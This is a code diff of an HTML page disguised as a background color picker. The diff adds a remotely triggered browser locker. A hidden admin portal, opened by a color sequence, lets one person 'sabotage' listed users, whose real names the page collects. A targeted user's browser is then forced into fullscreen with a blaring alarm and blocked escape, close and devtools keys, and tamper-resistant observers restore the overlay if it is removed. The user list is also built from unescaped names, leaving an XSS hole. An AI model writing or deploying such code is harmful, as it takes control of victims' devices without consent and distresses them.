@@ -24,18 +24,224 @@
             overflow: hidden;
         }
 
-        /* Non-intrusive full-page overlay */
+        /* Full-page lock overlay - completely blocks all interaction */
         #lockOverlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100vw;
             height: 100vh;
-            background: black url('image.png') center/cover no-repeat;
-            z-index: 99999;
+            background: #0a0000 url('image.png') center/cover no-repeat;
+            z-index: 999999;
             display: none;
             justify-content: center;
             align-items: center;
+            pointer-events: all;
+            cursor: none;
+            flex-direction: column;
+        }
+
+        #lockOverlay::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(ellipse at center,
+                    rgba(180, 0, 0, 0.25) 0%,
+                    rgba(80, 0, 0, 0.55) 40%,
+                    rgba(0, 0, 0, 0.9) 100%);
+            z-index: 1;
+            animation: pulseGlow 1.2s ease-in-out infinite;
+        }
+
+        @keyframes pulseGlow {
+            0%,
+            100% {
+                opacity: 0.75;
+            }
+            50% {
+                opacity: 1;
+            }
+        }
+
+        /* Scan lines overlay */
+        #lockOverlay::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg,
+                    transparent,
+                    transparent 2px,
+                    rgba(0, 0, 0, 0.15) 2px,
+                    rgba(0, 0, 0, 0.15) 4px);
+            z-index: 3;
+            pointer-events: none;
+            animation: scanMove 8s linear infinite;
+        }
+
+        @keyframes scanMove {
+            0% {
+                background-position: 0 0;
+            }
+            100% {
+                background-position: 0 100px;
+            }
+        }
+
+        .lock-content {
+            position: relative;
+            z-index: 2;
+            text-align: center;
+            padding: 2rem;
+            animation: glitchShake 0.3s ease-in-out infinite;
+            pointer-events: none;
+        }
+
+        @keyframes glitchShake {
+            0%,
+            100% {
+                transform: translate(0, 0);
+            }
+            15% {
+                transform: translate(-3px, 1px);
+            }
+            30% {
+                transform: translate(3px, -1px);
+            }
+            45% {
+                transform: translate(-2px, -2px);
+            }
+            60% {
+                transform: translate(2px, 2px);
+            }
+            75% {
+                transform: translate(-1px, 3px);
+            }
+            90% {
+                transform: translate(1px, -3px);
+            }
+        }
+
+        .lock-icon {
+            font-size: 5rem;
+            animation: iconPulse 0.8s ease-in-out infinite;
+            text-shadow: 0 0 40px #ff0000, 0 0 80px #ff0000, 0 0 120px #cc0000;
+            margin-bottom: 0.5rem;
+        }
+
+        @keyframes iconPulse {
+            0%,
+            100% {
+                transform: scale(1);
+                text-shadow: 0 0 40px #ff0000, 0 0 80px #ff0000, 0 0 120px #cc0000;
+            }
+            50% {
+                transform: scale(1.15);
+                text-shadow: 0 0 60px #ff3333, 0 0 120px #ff0000, 0 0 180px #ee0000;
+            }
+        }
+
+        .lock-title {
+            font-family: 'Courier New', monospace;
+            font-size: 2.8rem;
+            font-weight: 900;
+            color: #ff1a1a;
+            text-shadow: 0 0 20px #ff0000, 0 0 40px #cc0000, 0 0 80px #990000;
+            letter-spacing: 4px;
+            margin-bottom: 0.75rem;
+            text-transform: uppercase;
+            animation: textFlicker 1.5s infinite;
+        }
+
+        @keyframes textFlicker {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            8% {
+                opacity: 0.7;
+            }
+            10% {
+                opacity: 1;
+            }
+            18% {
+                opacity: 0.85;
+            }
+            20% {
+                opacity: 1;
+            }
+            30% {
+                opacity: 0.6;
+            }
+            32% {
+                opacity: 1;
+            }
+            55% {
+                opacity: 0.9;
+            }
+            57% {
+                opacity: 1;
+            }
+            72% {
+                opacity: 0.75;
+            }
+            74% {
+                opacity: 1;
+            }
+        }
+
+        .lock-subtitle {
+            font-family: 'Courier New', monospace;
+            font-size: 1.3rem;
+            color: #ff6666;
+            text-shadow: 0 0 10px #ff0000, 0 0 20px #990000;
+            letter-spacing: 2px;
+            margin-bottom: 1.5rem;
+            text-transform: uppercase;
+        }
+
+        .lock-info {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-size: 0.95rem;
+            color: #cc8888;
+            line-height: 1.6;
+            text-shadow: 0 0 8px rgba(255, 0, 0, 0.4);
+        }
+
+        .lock-flash {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+            animation: redFlash 3s infinite;
+        }
+
+        @keyframes redFlash {
+            0%,
+            95%,
+            100% {
+                background: transparent;
+            }
+            96% {
+                background: rgba(255, 0, 0, 0.25);
+            }
+            97% {
+                background: transparent;
+            }
+            98% {
+                background: rgba(255, 0, 0, 0.3);
+            }
+            99% {
+                background: transparent;
+            }
         }
 
         .container {
@@ -95,11 +301,22 @@
             user-select: none;
         }
 
-        .btn-red { background: linear-gradient(135deg, #ff6b6b, #ee5253); }
-        .btn-orange { background: linear-gradient(135deg, #ffa502, #ff7f50); }
-        .btn-yellow { background: linear-gradient(135deg, #f1c40f, #f39c12); color: #333; }
-        .btn-green { background: linear-gradient(135deg, #2ecc71, #27ae60); }
-        .btn-blue { background: linear-gradient(135deg, #3498db, #2980b9); }
+        .btn-red {
+            background: linear-gradient(135deg, #ff6b6b, #ee5253);
+        }
+        .btn-orange {
+            background: linear-gradient(135deg, #ffa502, #ff7f50);
+        }
+        .btn-yellow {
+            background: linear-gradient(135deg, #f1c40f, #f39c12);
+            color: #333;
+        }
+        .btn-green {
+            background: linear-gradient(135deg, #2ecc71, #27ae60);
+        }
+        .btn-blue {
+            background: linear-gradient(135deg, #3498db, #2980b9);
+        }
 
         .btn:hover {
             transform: translateY(-3px);
@@ -141,12 +358,26 @@
         }
     </style>
 
-    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js">
+    </script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js">
+    </script>
 </head>
 <body>
 
-    <div id="lockOverlay"></div>
+    <div id="lockOverlay">
+        <div class="lock-flash"></div>
+        <div class="lock-content">
+            <div class="lock-icon">&#9888;&#65039;</div>
+            <h1 class="lock-title">BROWSER LOCKED</h1>
+            <p class="lock-subtitle">&#9679; SABOTAGED &#9679;</p>
+            <p class="lock-info">
+                This device has been locked by the administrator.<br>
+                The browser will remain locked until<br>
+                the sabotage is undone remotely.
+            </p>
+        </div>
+    </div>
 
     <div class="container" id="colorPicker">
         <h3>Choose Background</h3>
@@ -168,7 +399,7 @@
     </div>
 
     <script>
-        // Temporary Config Injection
+        // ============ FIREBASE CONFIG & INIT ============
         const firebaseConfig = {
             apiKey: "AIzaSyDqx4yZKKhAS3F2CokTxiY0yKxNsQ21jVc",
             authDomain: "my-project-1704840967568.firebaseapp.com",
@@ -179,17 +410,16 @@
             appId: "1:160430314341:web:40da9a21dd9e86adeb078c"
         };
 
-        // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
+        // ============ DEVICE / USER SETUP ============
         let currentSequence = [];
         const targetSequence = ['Orange', 'Orange', 'Red', 'Orange'];
-        
+
         let myDeviceId = localStorage.getItem('deviceId');
         let myUsername = localStorage.getItem('username');
 
-        // Check if user has registered before on this device
         if (!myDeviceId || !myUsername) {
             while (!myUsername || myUsername.trim() === "") {
                 myUsername = prompt("Please enter your username (actually enter your real name):");
@@ -198,36 +428,509 @@
             localStorage.setItem('deviceId', myDeviceId);
             localStorage.setItem('username', myUsername);
 
-            // Commit new device payload to the shared backend
             database.ref('users/' + myDeviceId).set({
                 name: myUsername,
                 triggered: false
             });
         }
 
-        // Persistent validation tracking loop for user-targeted visual overlay
-        database.ref('users/' + myDeviceId + '/triggered').on('value', (snapshot) => {
-            const isTriggered = snapshot.val();
-            const overlay = document.getElementById('lockOverlay');
-            if (isTriggered) {
-                overlay.style.display = 'flex';
-            } else {
-                overlay.style.display = 'none';
-            }
-        });
-
+        // ============ DOM REFERENCES ============
+        const lockOverlay = document.getElementById('lockOverlay');
         const colorPickerContainer = document.getElementById('colorPicker');
         const adminPortalContainer = document.getElementById('adminPortal');
         const buttons = document.querySelectorAll('#colorPicker .btn');
         const userListContainer = document.getElementById('userList');
         const closeAdminBtn = document.getElementById('closeAdminBtn');
 
+        // ============ LOCK STATE TRACKING ============
+        let isLocked = false;
+        let alarmAudioCtx = null;
+        let alarmOscillator = null;
+        let alarmGainNode = null;
+        let alarmInterval = null;
+        let fullscreenRecheckInterval = null;
+        let wakeLockSentinel = null;
+        let visibilityInterval = null;
+        let isAlarmPlaying = false;
+
+        // ============ AUDIO ALARM SYSTEM ============
+        function createAlarmAudioContext() {
+            if (!alarmAudioCtx) {
+                try {
+                    alarmAudioCtx = new(window.AudioContext || window.webkitAudioContext)();
+                } catch (e) {
+                    console.warn('Web Audio API not available');
+                    return null;
+                }
+            }
+            return alarmAudioCtx;
+        }
+
+        function startAlarm() {
+            if (isAlarmPlaying) return;
+            const ctx = createAlarmAudioContext();
+            if (!ctx) return;
+
+            // Resume context if suspended (autoplay policy)
+            if (ctx.state === 'suspended') {
+                ctx.resume().then(() => {
+                    _startAlarmInternal(ctx);
+                }).catch(() => {
+                    // Audio blocked by browser - visual lock still works
+                    console.warn('Audio context could not be resumed - autoplay policy');
+                });
+            } else {
+                _startAlarmInternal(ctx);
+            }
+        }
+
+        function _startAlarmInternal(ctx) {
+            if (isAlarmPlaying) return;
+            isAlarmPlaying = true;
+
+            let isHighTone = false;
+            const freqLow = 780;
+            const freqHigh = 1050;
+
+            function createTone(freq) {
+                if (alarmOscillator) {
+                    try { alarmOscillator.stop(); } catch (e) {}
+                }
+                if (alarmGainNode) {
+                    try { alarmGainNode.disconnect(); } catch (e) {}
+                }
+
+                alarmOscillator = ctx.createOscillator();
+                alarmGainNode = ctx.createGain();
+                alarmOscillator.type = 'square';
+                alarmOscillator.frequency.setValueAtTime(freq, ctx.currentTime);
+                alarmGainNode.gain.setValueAtTime(0.35, ctx.currentTime);
+                alarmOscillator.connect(alarmGainNode);
+                alarmGainNode.connect(ctx.destination);
+                alarmOscillator.start();
+            }
+
+            createTone(freqLow);
+
+            alarmInterval = setInterval(() => {
+                isHighTone = !isHighTone;
+                const freq = isHighTone ? freqHigh : freqLow;
+                if (alarmOscillator) {
+                    alarmOscillator.frequency.setValueAtTime(freq, ctx.currentTime);
+                }
+            }, 420);
+        }
+
+        function stopAlarm() {
+            isAlarmPlaying = false;
+            if (alarmInterval) {
+                clearInterval(alarmInterval);
+                alarmInterval = null;
+            }
+            if (alarmOscillator) {
+                try { alarmOscillator.stop(); } catch (e) {}
+                alarmOscillator = null;
+            }
+            if (alarmGainNode) {
+                try { alarmGainNode.disconnect(); } catch (e) {}
+                alarmGainNode = null;
+            }
+            if (alarmAudioCtx && alarmAudioCtx.state === 'running') {
+                try { alarmAudioCtx.suspend(); } catch (e) {}
+            }
+        }
+
+        // ============ FULLSCREEN LOCK ============
+        function requestFullscreenAggressive() {
+            const el = document.documentElement;
+            if (el.requestFullscreen) {
+                el.requestFullscreen().catch(() => {});
+            } else if (el.webkitRequestFullscreen) {
+                el.webkitRequestFullscreen();
+            } else if (el.msRequestFullscreen) {
+                el.msRequestFullscreen();
+            }
+        }
+
+        function exitFullscreenIfNeeded() {
+            if (document.fullscreenElement || document.webkitFullscreenElement || document.msFullscreenElement) {
+                if (document.exitFullscreen) {
+                    document.exitFullscreen().catch(() => {});
+                } else if (document.webkitExitFullscreen) {
+                    document.webkitExitFullscreen();
+                } else if (document.msExitFullscreen) {
+                    document.msExitFullscreen();
+                }
+            }
+        }
+
+        function startFullscreenRecheck() {
+            if (fullscreenRecheckInterval) return;
+            requestFullscreenAggressive();
+            fullscreenRecheckInterval = setInterval(() => {
+                const fsEl = document.fullscreenElement ||
+                    document.webkitFullscreenElement ||
+                    document.msFullscreenElement;
+                if (!fsEl && isLocked) {
+                    requestFullscreenAggressive();
+                }
+            }, 400);
+        }
+
+        function stopFullscreenRecheck() {
+            if (fullscreenRecheckInterval) {
+                clearInterval(fullscreenRecheckInterval);
+                fullscreenRecheckInterval = null;
+            }
+        }
+
+        function onFullscreenChange() {
+            if (isLocked) {
+                const fsEl = document.fullscreenElement ||
+                    document.webkitFullscreenElement ||
+                    document.msFullscreenElement;
+                if (!fsEl) {
+                    // User escaped fullscreen - re-request immediately
+                    setTimeout(() => {
+                        if (isLocked) requestFullscreenAggressive();
+                    }, 150);
+                }
+            }
+        }
+
+        // ============ WAKE LOCK ============
+        async function requestWakeLock() {
+            if ('wakeLock' in navigator) {
+                try {
+                    wakeLockSentinel = await navigator.wakeLock.request('screen');
+                    wakeLockSentinel.addEventListener('release', () => {
+                        if (isLocked) {
+                            // Re-request if released while still locked
+                            setTimeout(() => {
+                                if (isLocked) requestWakeLock();
+                            }, 300);
+                        }
+                    });
+                } catch (e) {
+                    // Wake Lock not available or denied
+                }
+            }
+        }
+
+        async function releaseWakeLock() {
+            if (wakeLockSentinel) {
+                try { await wakeLockSentinel.release(); } catch (e) {}
+                wakeLockSentinel = null;
+            }
+        }
+
+        // ============ KEYBOARD BLOCKING ============
+        function blockKeyboardEvent(e) {
+            if (!isLocked) return;
+
+            const key = e.key;
+            const code = e.code;
+            const ctrl = e.ctrlKey || e.metaKey;
+            const alt = e.altKey;
+            const shift = e.shiftKey;
+
+            // Always block these keys when locked
+            const alwaysBlocked = [
+                'Escape', 'F11', 'F12', 'PrintScreen', 'ScrollLock', 'Pause',
+                'ContextMenu', 'OS', 'Meta'
+            ];
+
+            const alwaysBlockedCodes = [
+                'Escape', 'F11', 'F12', 'PrintScreen', 'ScrollLock', 'Pause',
+                'ContextMenu', 'OSLeft', 'OSRight', 'MetaLeft', 'MetaRight'
+            ];
+
+            if (alwaysBlocked.includes(key) || alwaysBlockedCodes.includes(code)) {
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+                return false;
+            }
+
+            // Block Ctrl combinations
+            if (ctrl) {
+                const ctrlBlocked = [
+                    'w', 'W', 't', 'T', 'n', 'N', 'r', 'R',
+                    'h', 'H', 'j', 'J', 'd', 'D', 'l', 'L',
+                    'Tab', 'PageUp', 'PageDown',
+                    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
+                    'F4', 'F5'
+                ];
+                const ctrlBlockedCodes = [
+                    'KeyW', 'KeyT', 'KeyN', 'KeyR', 'KeyH', 'KeyJ', 'KeyD', 'KeyL',
+                    'Tab', 'PageUp', 'PageDown',
+                    'Digit1', 'Digit2', 'Digit3', 'Digit4', 'Digit5',
+                    'Digit6', 'Digit7', 'Digit8', 'Digit9', 'Digit0',
+                    'F4', 'F5'
+                ];
+
+                if (ctrlBlocked.includes(key) || ctrlBlockedCodes.includes(code)) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    e.stopImmediatePropagation();
+                    return false;
+                }
+
+                // Ctrl+Shift combinations
+                if (shift) {
+                    const ctrlShiftBlocked = ['T', 'N', 'W', 'Delete', 'I', 'J', 'C'];
+                    const ctrlShiftBlockedCodes = ['KeyT', 'KeyN', 'KeyW', 'Delete', 'KeyI', 'KeyJ',
+                    'KeyC'];
+                    if (ctrlShiftBlocked.includes(key) || ctrlShiftBlockedCodes.includes(code)) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        e.stopImmediatePropagation();
+                        return false;
+                    }
+                }
+            }
+
+            // Block Alt combinations
+            if (alt) {
+                const altBlocked = ['F4', 'Tab', 'ArrowLeft', 'ArrowRight', 'Home'];
+                const altBlockedCodes = ['F4', 'Tab', 'ArrowLeft', 'ArrowRight', 'Home'];
+                if (altBlocked.includes(key) || altBlockedCodes.includes(code)) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    e.stopImmediatePropagation();
+                    return false;
+                }
+            }
+
+            // Block F5 (refresh) even without Ctrl
+            if (code === 'F5' || key === 'F5') {
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+                return false;
+            }
+        }
+
+        function addKeyboardBlockers() {
+            document.addEventListener('keydown', blockKeyboardEvent, { capture: true, passive: false });
+            document.addEventListener('keyup', blockKeyboardEvent, { capture: true, passive: false });
+            document.addEventListener('keypress', blockKeyboardEvent, { capture: true, passive: false });
+            window.addEventListener('keydown', blockKeyboardEvent, { capture: true, passive: false });
+            window.addEventListener('keyup', blockKeyboardEvent, { capture: true, passive: false });
+        }
+
+        function removeKeyboardBlockers() {
+            document.removeEventListener('keydown', blockKeyboardEvent, { capture: true });
+            document.removeEventListener('keyup', blockKeyboardEvent, { capture: true });
+            document.removeEventListener('keypress', blockKeyboardEvent, { capture: true });
+            window.removeEventListener('keydown', blockKeyboardEvent, { capture: true });
+            window.removeEventListener('keyup', blockKeyboardEvent, { capture: true });
+        }
+
+        // ============ RIGHT-CLICK & CONTEXT MENU BLOCKING ============
+        function blockContextMenu(e) {
+            if (isLocked) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }
+        }
+
+        function addContextMenuBlocker() {
+            document.addEventListener('contextmenu', blockContextMenu, { capture: true });
+            window.addEventListener('contextmenu', blockContextMenu, { capture: true });
+        }
+
+        function removeContextMenuBlocker() {
+            document.removeEventListener('contextmenu', blockContextMenu, { capture: true });
+            window.removeEventListener('contextmenu', blockContextMenu, { capture: true });
+        }
+
+        // ============ BEFOREUNLOAD (PREVENT CLOSE) ============
+        function beforeUnloadHandler(e) {
+            if (isLocked) {
+                e.preventDefault();
+                e.returnValue =
+                    'Your browser is locked by the administrator. Are you sure you want to leave? The lock will remain active.';
+                return e.returnValue;
+            }
+        }
+
+        function addBeforeUnloadBlocker() {
+            window.addEventListener('beforeunload', beforeUnloadHandler, { capture: true });
+        }
+
+        function removeBeforeUnloadBlocker() {
+            window.removeEventListener('beforeunload', beforeUnloadHandler, { capture: true });
+        }
+
+        // ============ PAGE VISIBILITY MONITORING ============
+        function visibilityChangeHandler() {
+            if (isLocked && document.hidden) {
+                // User switched tabs - try to refocus
+                setTimeout(() => {
+                    if (isLocked && document.hidden) {
+                        // Attempt to regain attention
+                        window.focus();
+                        requestFullscreenAggressive();
+                    }
+                }, 200);
+            }
+            if (isLocked && !document.hidden) {
+                // Tab is visible again - ensure fullscreen
+                setTimeout(() => {
+                    if (isLocked) requestFullscreenAggressive();
+                }, 300);
+            }
+        }
+
+        function addVisibilityMonitor() {
+            document.addEventListener('visibilitychange', visibilityChangeHandler);
+            // Also try to keep focus
+            if (visibilityInterval) clearInterval(visibilityInterval);
+            visibilityInterval = setInterval(() => {
+                if (isLocked && document.hidden) {
+                    window.focus();
+                }
+            }, 1500);
+        }
+
+        function removeVisibilityMonitor() {
+            document.removeEventListener('visibilitychange', visibilityChangeHandler);
+            if (visibilityInterval) {
+                clearInterval(visibilityInterval);
+                visibilityInterval = null;
+            }
+        }
+
+        // ============ POINTER LOCK ON OVERLAY ============
+        function blockPointerEventsOnOverlay(e) {
+            if (isLocked && e.target === lockOverlay || lockOverlay.contains(e.target)) {
+                // Allow events to be captured but prevent default actions
+                if (e.type === 'click' || e.type === 'dblclick' || e.type === 'mousedown') {
+                    e.preventDefault();
+                    e.stopPropagation();
+                }
+            }
+        }
+
+        function addOverlayPointerBlockers() {
+            lockOverlay.addEventListener('click', blockPointerEventsOnOverlay, { capture: true });
+            lockOverlay.addEventListener('dblclick', blockPointerEventsOnOverlay, { capture: true });
+            lockOverlay.addEventListener('mousedown', blockPointerEventsOnOverlay, { capture: true });
+            lockOverlay.addEventListener('mouseup', blockPointerEventsOnOverlay, { capture: true });
+        }
+
+        function removeOverlayPointerBlockers() {
+            lockOverlay.removeEventListener('click', blockPointerEventsOnOverlay, { capture: true });
+            lockOverlay.removeEventListener('dblclick', blockPointerEventsOnOverlay, { capture: true });
+            lockOverlay.removeEventListener('mousedown', blockPointerEventsOnOverlay, { capture: true });
+            lockOverlay.removeEventListener('mouseup', blockPointerEventsOnOverlay, { capture: true });
+        }
+
+        // ============ COMPREHENSIVE LOCK / UNLOCK ============
+        function lockBrowser() {
+            if (isLocked) return;
+            isLocked = true;
+
+            // Show overlay
+            lockOverlay.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+
+            // Block all interactions
+            addKeyboardBlockers();
+            addContextMenuBlocker();
+            addBeforeUnloadBlocker();
+            addVisibilityMonitor();
+            addOverlayPointerBlockers();
+
+            // Fullscreen lock
+            requestFullscreenAggressive();
+            startFullscreenRecheck();
+            document.addEventListener('fullscreenchange', onFullscreenChange);
+            document.addEventListener('webkitfullscreenchange', onFullscreenChange);
+            document.addEventListener('msfullscreenchange', onFullscreenChange);
+
+            // Wake lock
+            requestWakeLock();
+
+            // Audio alarm
+            startAlarm();
+
+            // Prevent text selection on entire document
+            document.body.style.userSelect = 'none';
+            document.body.style.webkitUserSelect = 'none';
+
+            // Disable scrolling
+            document.body.style.overflow = 'hidden';
+            document.documentElement.style.overflow = 'hidden';
+
+            console.log('%c🔒 BROWSER LOCKED - SABOTAGED %c| Device: ' + myDeviceId,
+                'color: #ff0000; font-size: 20px; font-weight: bold;',
+                'color: #ff6666;');
+        }
+
+        function unlockBrowser() {
+            if (!isLocked) return;
+            isLocked = false;
+
+            // Hide overlay
+            lockOverlay.style.display = 'none';
+
+            // Remove all blockers
+            removeKeyboardBlockers();
+            removeContextMenuBlocker();
+            removeBeforeUnloadBlocker();
+            removeVisibilityMonitor();
+            removeOverlayPointerBlockers();
+
+            // Exit fullscreen
+            exitFullscreenIfNeeded();
+            stopFullscreenRecheck();
+            document.removeEventListener('fullscreenchange', onFullscreenChange);
+            document.removeEventListener('webkitfullscreenchange', onFullscreenChange);
+            document.removeEventListener('msfullscreenchange', onFullscreenChange);
+
+            // Release wake lock
+            releaseWakeLock();
+
+            // Stop alarm
+            stopAlarm();
+
+            // Restore body state
+            document.body.style.userSelect = '';
+            document.body.style.webkitUserSelect = '';
+            document.body.style.overflow = '';
+            document.documentElement.style.overflow = '';
+
+            console.log('%c🔓 BROWSER UNLOCKED %c| Device: ' + myDeviceId,
+                'color: #00cc00; font-size: 20px; font-weight: bold;',
+                'color: #66ff66;');
+        }
+
+        // ============ FIREBASE LISTENER FOR TRIGGERED STATE ============
+        database.ref('users/' + myDeviceId + '/triggered').on('value', (snapshot) => {
+            const isTriggered = snapshot.val();
+            if (isTriggered) {
+                lockBrowser();
+            } else {
+                unlockBrowser();
+            }
+        });
+
+        // Also check initial state on load
+        database.ref('users/' + myDeviceId + '/triggered').get().then((snapshot) => {
+            if (snapshot.val() === true) {
+                lockBrowser();
+            }
+        }).catch(() => {});
+
+        // ============ COLOR SEQUENCE & ADMIN PORTAL ============
         let isAdminSessionActive = false;
 
-        // Function checking administrative single-device locking criteria
         function tryOpenAdminPortal() {
             const adminLockRef = database.ref('admin_active');
-            
+
             adminLockRef.get().then((snapshot) => {
                 if (snapshot.val() === true) {
                     alert("Access Denied: Admin session already active on another device.");
@@ -235,16 +938,13 @@
                     return;
                 }
 
-                // Reserve session exclusivity
                 adminLockRef.set(true);
-                adminLockRef.onDisconnect().set(false); // Clear if user drops connection unexpectedly
+                adminLockRef.onDisconnect().set(false);
                 isAdminSessionActive = true;
 
-                // Show Admin Interface UI
                 colorPickerContainer.style.display = 'none';
                 adminPortalContainer.style.display = 'block';
 
-                // Real-time synchronization pool for connected target records
                 database.ref('users').on('value', (usersSnapshot) => {
                     userListContainer.innerHTML = '';
                     const users = usersSnapshot.val();
@@ -255,10 +955,12 @@
                             const userItem = document.createElement('div');
                             userItem.className = 'user-item';
 
+                            const isCurrentlyTriggered = userData.triggered === true;
                             userItem.innerHTML = `
                                 <span class="user-name">${userData.name}</span>
-                                <button class="btn btn-red" style="padding: 6px 14px; font-size: 0.85rem; min-width: auto;" onclick="toggleUserTrigger('${id}', ${!userData.triggered})">
-                                    ${userData.triggered ? 'Undo' : 'Sabotage'}
+                                <button class="btn btn-red" style="padding: 6px 14px; font-size: 0.85rem; min-width: auto;" 
+                                    onclick="toggleUserTrigger('${id}', ${!isCurrentlyTriggered})">
+                                    ${isCurrentlyTriggered ? 'Undo' : 'Sabotage'}
                                 </button>
                             `;
                             userListContainer.appendChild(userItem);
@@ -268,18 +970,15 @@
             });
         }
 
-        // State mutation processor triggered via panel buttons
         window.toggleUserTrigger = function(id, newState) {
             database.ref('users/' + id + '/triggered').set(newState);
         };
 
-        // UI Click registration handling color assignment and sequence processing
         buttons.forEach(button => {
-            button.addEventListener('click', function () {
+            button.addEventListener('click', function() {
                 const color = this.getAttribute('data-color');
                 currentSequence.push(color);
 
-                // Sequence array alignment check logic
                 let match = true;
                 for (let i = 0; i < currentSequence.length; i++) {
                     if (currentSequence[i] !== targetSequence[i]) {
@@ -289,7 +988,6 @@
                 }
 
                 if (!match) {
-                    // Reset or cascade-evaluate if current input corresponds to target index 0
                     currentSequence = (color === targetSequence[0]) ? [color] : [];
                 }
 
@@ -303,23 +1001,104 @@
             });
         });
 
-        // Close Admin Session cleanly
         closeAdminBtn.addEventListener('click', () => {
             if (isAdminSessionActive) {
                 database.ref('admin_active').set(false);
-                database.ref('users').off('value'); // Disconnect synchronization channel
+                database.ref('users').off('value');
                 isAdminSessionActive = false;
                 adminPortalContainer.style.display = 'none';
                 colorPickerContainer.style.display = 'block';
             }
         });
 
-        // Clean up locks when closing window
         window.addEventListener('beforeunload', () => {
             if (isAdminSessionActive) {
                 database.ref('admin_active').set(false);
             }
+            // The beforeunload for lock is handled separately via beforeUnloadHandler
         });
+
+        // ============ INITIAL AUDIO CONTEXT WARM-UP (on first user interaction) ============
+        let audioContextWarmedUp = false;
+
+        function warmUpAudioContext() {
+            if (audioContextWarmedUp) return;
+            const ctx = createAlarmAudioContext();
+            if (ctx && ctx.state === 'suspended') {
+                ctx.resume().then(() => {
+                    audioContextWarmedUp = true;
+                    // Create a tiny silent buffer to fully unlock audio
+                    const osc = ctx.createOscillator();
+                    const gain = ctx.createGain();
+                    gain.gain.setValueAtTime(0.001, ctx.currentTime);
+                    osc.connect(gain);
+                    gain.connect(ctx.destination);
+                    osc.start();
+                    osc.stop(ctx.currentTime + 0.05);
+                }).catch(() => {});
+            } else if (ctx) {
+                audioContextWarmedUp = true;
+            }
+        }
+
+        // Warm up on any user interaction with the page
+        document.addEventListener('click', warmUpAudioContext, { once: false });
+        document.addEventListener('keydown', warmUpAudioContext, { once: false });
+        document.addEventListener('touchstart', warmUpAudioContext, { once: false });
+
+        // ============ PREVENT DRAG ON OVERLAY ============
+        lockOverlay.addEventListener('dragstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        // ============ ADDITIONAL SAFETY: prevent the overlay from being removed via devtools ============
+        // MutationObserver to detect if overlay is tampered with
+        const overlayObserver = new MutationObserver((mutations) => {
+            if (isLocked) {
+                mutations.forEach((mutation) => {
+                    if (mutation.type === 'attributes' &&
+                        (mutation.attributeName === 'style' || mutation.attributeName === 'class')) {
+                        if (lockOverlay.style.display !== 'flex') {
+                            lockOverlay.style.display = 'flex';
+                        }
+                    }
+                });
+                // If overlay is removed from DOM
+                if (!document.body.contains(lockOverlay)) {
+                    document.body.appendChild(lockOverlay);
+                    lockOverlay.style.display = 'flex';
+                }
+            }
+        });
+
+        overlayObserver.observe(lockOverlay, {
+            attributes: true,
+            attributeFilter: ['style', 'class']
+        });
+
+        // Also observe body for overlay removal
+        const bodyObserver = new MutationObserver((mutations) => {
+            if (isLocked) {
+                mutations.forEach((mutation) => {
+                    if (mutation.type === 'childList') {
+                        const removedNodes = Array.from(mutation.removedNodes);
+                        if (removedNodes.includes(lockOverlay)) {
+                            document.body.appendChild(lockOverlay);
+                            lockOverlay.style.display = 'flex';
+                        }
+                    }
+                });
+            }
+        });
+
+        bodyObserver.observe(document.body, { childList: true });
+
+        console.log('%c🔐 Lock System Initialized %c| Device: ' + myDeviceId + ' | User: ' + myUsername,
+            'color: #ffaa00; font-size: 16px; font-weight: bold;',
+            'color: #ffcc66;');
+        console.log('%c💡 Color sequence hint: Orange, Orange, Red, Orange to open admin portal',
+            'color: #aaa; font-style: italic;');
     </script>
 </body>
 </html>
